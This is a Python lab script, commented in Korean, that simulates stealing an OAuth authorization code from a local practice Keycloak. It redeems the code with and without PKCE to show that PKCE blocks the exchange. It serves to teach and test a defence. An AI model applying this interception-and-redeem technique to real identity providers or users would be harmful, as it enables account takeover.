"""코드 가로채기 재현: 사용자가 로그인해 받은 인가 코드를 다른 쪽이 대신 토큰으로 바꿔 봅니다.

실행: python attack.py lab-vuln   또는   python attack.py lab-pkce
연습용 사용자와 연습용 Keycloak 에만 사용합니다.
"""
import base64
import hashlib
import re
import secrets
import sys
from html import unescape
from urllib.parse import parse_qs, urlencode, urlparse

import requests

BASE = "http://localhost:5480/realms/lab/protocol/openid-connect"
REDIRECT = "http://localhost:5481/callback"
CLIENT = sys.argv[1]


def b64url(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def get_code(use_pkce):
    """사용자 대신 로그인해서 리디렉션 주소에 실린 인가 코드를 꺼냅니다(가로채기 흉내)."""
    verifier = b64url(secrets.token_bytes(32))
    params = {"client_id": CLIENT, "response_type": "code", "scope": "openid",
              "redirect_uri": REDIRECT, "state": "x"}
    if use_pkce:
        params["code_challenge"] = b64url(hashlib.sha256(verifier.encode()).digest())
        params["code_challenge_method"] = "S256"
    s = requests.Session()
    r = s.get(f"{BASE}/auth?{urlencode(params)}", allow_redirects=False, timeout=10)
    if r.status_code != 200:
        return None, verifier, r
    # Keycloak 은 http 에서도 Secure 쿠키를 보냅니다. 브라우저는 localhost 를 안전한 곳으로 보지만
    # requests 는 아니므로, 이 실습 스크립트에서만 Secure 표시를 끕니다.
    for c in s.cookies:
        c.secure = False
    action = unescape(re.search(r'action="([^"]+)"', r.text).group(1))
    r = s.post(action, data={"username": "lab-user", "password": "lab-user-pass"},
               allow_redirects=False, timeout=10)
    code = parse_qs(urlparse(r.headers["Location"]).query)["code"][0]
    return code, verifier, r


def exchange(code, verifier=None):
    data = {"grant_type": "authorization_code", "code": code,
            "redirect_uri": REDIRECT, "client_id": CLIENT}
    if verifier:
        data["code_verifier"] = verifier
    return requests.post(f"{BASE}/token", data=data, timeout=10)


def show(label, r):
    body = r.json()
    if r.status_code == 200:
        print(f"{label}: HTTP 200 토큰 발급됨 ({', '.join(k for k in body if k.endswith('token'))})")
    else:
        print(f"{label}: HTTP {r.status_code} {body.get('error')} / {body.get('error_description')}")


print(f"== client_id={CLIENT}")
# 1) PKCE 를 쓰지 않는 요청: 코드만 가로채면 verifier 없이 교환할 수 있는지
code, _, r = get_code(use_pkce=False)
if code is None:
    reason = parse_qs(urlparse(r.headers.get("Location", "")).query).get("error_description", ["-"])[0]
    print(f"PKCE 없는 인증 요청: HTTP {r.status_code} 거부 ({reason})")
else:
    show("PKCE 없이 받은 코드를 code_verifier 없이 교환", exchange(code))
# 2) PKCE 를 쓰는 요청: 코드를 가로챘어도 verifier 가 없으면 교환이 되는지
code, verifier, _ = get_code(use_pkce=True)
show("PKCE 로 받은 코드를 code_verifier 없이 교환", exchange(code))
code, verifier, _ = get_code(use_pkce=True)
show("PKCE 로 받은 코드를 엉뚱한 code_verifier 로 교환", exchange(code, b64url(secrets.token_bytes(32))))
code, verifier, _ = get_code(use_pkce=True)
show("PKCE 로 받은 코드를 올바른 code_verifier 로 교환", exchange(code, verifier))
